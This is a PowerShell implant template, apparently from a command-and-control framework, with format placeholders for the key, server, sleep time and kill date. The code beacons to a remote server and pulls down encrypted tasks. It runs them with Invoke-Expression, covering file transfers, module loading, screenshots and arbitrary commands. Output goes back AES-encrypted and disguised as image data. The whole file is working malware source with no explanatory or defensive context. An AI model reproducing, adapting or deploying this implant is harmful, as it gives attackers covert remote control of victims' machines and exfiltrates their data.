#GlobalVars

$Key="%s"
$Jitter='%s'
$Global:SleepTime = '%s'
$URI= "%s"
$Server = "$s/%s"
$ServerClean = "$sc"
$Rotate = ""


Function Beacon($sleeptime) {
    if ($sleeptime.ToLower().Contains('m')) {
        $sleeptime = $sleeptime -replace 'm', ''
        [int]$newsleep = $sleeptime
        [int]$newsleep = $newsleep * 60
    }
    elseif ($sleeptime.ToLower().Contains('h')) {
        $sleeptime = $sleeptime -replace 'h', ''
        [int]$newsleep1 = $sleeptime
        [int]$newsleep2 = $newsleep1 * 60
        [int]$newsleep = $newsleep2 * 60
    }
    elseif ($sleeptime.ToLower().Contains('s')) {
        $newsleep = $sleeptime -replace 's', ''
    } else {
        $newsleep = $sleeptime
    }
    $script:sleeptime = $newsleep
}

Beacon($SleepTime)

function GetImgData($cmdoutput) {
    $icoimage = @(%s)

    try {$image = $icoimage|get-random}catch{}

    function randomgen
    {
        param (
            [int]$Length
        )
        $set = "...................@..........................Tyscf".ToCharArray()
        $result = ""
        for ($x = 0; $x -lt $Length; $x++)
        {$result += $set | Get-Random}
        return $result
    }
    $imageBytes = [Convert]::FromBase64String($image)
    $maxbyteslen = 1500
    $maxdatalen = 1500 + ($cmdoutput.Length)
    $imagebyteslen = $imageBytes.Length
    $paddingbyteslen = $maxbyteslen - $imagebyteslen
    $BytePadding = [System.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
    $ImageBytesFull = New-Object byte[] $maxdatalen
    [System.Array]::Copy($imageBytes, 0, $ImageBytesFull, 0, $imageBytes.Length)
    [System.Array]::Copy($BytePadding, 0, $ImageBytesFull,$imageBytes.Length, $BytePadding.Length)
    [System.Array]::Copy($cmdoutput, 0, $ImageBytesFull,$imageBytes.Length+$BytePadding.Length, $cmdoutput.Length )
    $ImageBytesFull
}

function Encrypt-CompressedString($key, $unencryptedString) {
    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object System.IO.Compression.GzipStream $CompressedStream, ([IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
    $DeflateStream.Dispose()
    $bytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $fullData
}

function Encrypt-RawData($key, $bytes) {
    [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
    $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
    $gzipStream.Write( $bytes, 0, $bytes.Length )
    $gzipStream.Close()
    $bytes = $output.ToArray()
    $output.Close()
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $fullData
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)))
}

function Send-Response($Server, $Key, $TaskId, $Data) {
    $attempts = 0
    while ($attempts -lt 5) {
      $attempts += 1;
      try
      {
        $eid = Encrypt-String $Key $TaskId
        $Output = Encrypt-CompressedString $Key $Data
        $UploadBytes = getimgdata $Output
        (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
        $attempts = 5;
      }
      catch
      {
        Write-Output "ErrorResponse: " + $error[0]
        Write-Output(Resolve-Error)
      }
    }
  }

function Send-ResponseAsync($Server, $Key, $TaskId, $Data)
{
  try
  {
      $eid = Encrypt-String $Key $TaskId
      $Output = Encrypt-CompressedString $Key $Data
      $UploadBytes = getimgdata $Output
      $wc=(Get-Webclient -Cookie $eid)
      #$Job = Register-ObjectEvent -InputObject $wc -EventName "UploadDataCompleted" -Action {}
      $wc.UploadDataAsync("$Server", $UploadBytes)|out-null
  }
  catch
  {
    Write-Output "ErrorResponse: " + $error[0]
    Write-Output(Resolve-Error)
  }
}

function GenerateURL
{
    $RandomURI = Get-Random $URLS
    $num = Get-Random -Minimum 0 -Maximum ($ServerURLS.Count)
    $ServerClean = $ServerURLS[$num]
    if (!$rotdf){
        #dfset
    } else {
        $script:h = $rotdf[$num]
    }
    $G=[guid]::NewGuid()
    $Server = "$ServerClean/$RandomURI$G/?$URI"
    return $Server
}

function Resolve-Error ($ErrorRecord=$Error[0])
{
   $ErrorRecord | Format-List * -Force
   $ErrorRecord.InvocationInfo |Format-List *
   $Exception = $ErrorRecord.Exception
   for ($i = 0; $Exception; $i++, ($Exception = $Exception.InnerException))
   {   "$i" * 80
       $Exception |Format-List * -Force
   }
}

while($true)
{
    if (!$rotate){
        $ServerURLS = "$($ServerClean)","$($ServerClean)"
    } else {
        $ServerURLS = $rotate
    }
    $date = (Get-Date -Format "yyyy-MM-dd")
    $date = [datetime]::ParseExact($date,"yyyy-MM-dd",$null)
    $killdate = [datetime]::ParseExact("%s","yyyy-MM-dd",$null)
    if ($killdate -lt $date) {exit}
    $sleeptimeran = ([int]$sleeptime * (1 + $Jitter))..([int]$sleeptime * (1 - $Jitter))
    $newsleep = $sleeptimeran|get-random
    if ($newsleep -lt 1) {$newsleep = 5}
    start-sleep $newsleep
    $URLS = %s
    $Server = GenerateURL
    try { $ReadCommand = (Get-Webclient).DownloadString("$Server") } catch {}

    while($ReadCommand) {
        $Server = GenerateURL
        try { $ReadCommandClear = Decrypt-String $key $ReadCommand } catch {}
        $error.clear()
        try {
          if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
              if  ($ReadCommandClear.ToLower().StartsWith("multicmd")) {
                      $splitcmd = $ReadCommandClear -replace "multicmd",""
                      $split = $splitcmd -split "!d-3dion@LD!-d"
                      foreach ($i in $split){
                          $id = New-Object System.String($i, 0, 5)
                          $c = New-Object System.String($i, 5, ($i.Length - 5))
                          $i = $c
                          $Server = GenerateURL
                          $error.clear()
                          if ($i.ToLower().StartsWith("upload-file")) {
                              try {
                                  $Output = Invoke-Expression $i | out-string
                                  $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                  if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] } # $result doesn't appear to be used anywhere?
                              } catch {
                                  $Output = "ErrorUpload: " + $error[0]
                              }
                              Send-Response $Server $key $id $Output
                          } elseif ($i.ToLower().StartsWith("download-file")) {
                              try {
                                  $i = $i + " -taskid " + $id
                                  Invoke-Expression $i | Out-Null
                              }
                              catch {
                                  $Output = "ErrorDownload: " + $error[0]
                                  Send-Response $Server $key $id $Output
                              }
                          } elseif ($i.ToLower().StartsWith("load-module")) {
                              try {
                                  $modulename = $i -replace "load-module",""
                                  $Output = Invoke-Expression $modulename | out-string
                                  $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                              } catch {
                                  $Output = "ErrorLoadMod: " + $error[0]
                              }
                              Send-Response $Server $key $id $Output
                          } elseif ($i.ToLower().StartsWith("get-screenshot-allwindows")) {
                              try {
                                  $i = $i + " -taskid " + $id
                                  Invoke-Expression $i | Out-Null
                              }
                              catch {
                                  $Output = "ErrorScreenshotAllWindows: " + $error[0]
                                  Send-Response $Server $key $id $Output
                              }
                          } elseif ($i.ToLower().StartsWith("get-webpage")) {
                              try {
                                  $i = $i + " -taskid " + $id
                                  Invoke-Expression $i | Out-Null
                              }
                              catch {
                                  $Output = "ErrorGetWebpage: " + $error[0]
                                  Send-Response $Server $key $id $Output
                              }
                          } elseif ($i.ToLower().StartsWith("get-multi-screenshot")) {
                              try {
                                  $i = $i + " -taskid " + $id
                                  Invoke-Expression $i | Out-Null
                              }
                              catch {
                                  $Output = "ErrorScreenshotMulti: " + $error[0]
                                  Send-Response $Server $key $id $Output
                              }
                          } elseif ($i.ToLower().StartsWith("loadpowerstatus")) {
                              try {
                                  $i = $i + " -taskid " + $id
                                  Invoke-Expression $i | Out-Null
                              }
                              catch {
                                  $Output = "Error - loadpowerstatus: " + $error[0]
                                  Send-Response $Server $key $id $Output
                              }
                            }
                            else {
                              try {
                                  $Output = Invoke-Expression $i | out-string
                                  $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                  $StdError = ($error[0] | Out-String)
                                  if ($StdError){
                                    $Output = $Output + $StdError
                                    $error.clear()
                                  }
                              } catch {
                                  $Output = "ErrorCmd: " + $error[0]
                              }
                              Send-Response $Server $key $id $Output
                          }
                      }
              }

            $ReadCommandClear = $null
            $ReadCommand = $null
          }
        } catch {
            $message = $_.Exception.Message
            Send-Response $Server $key "Error" $message
        }
        break
    }
}
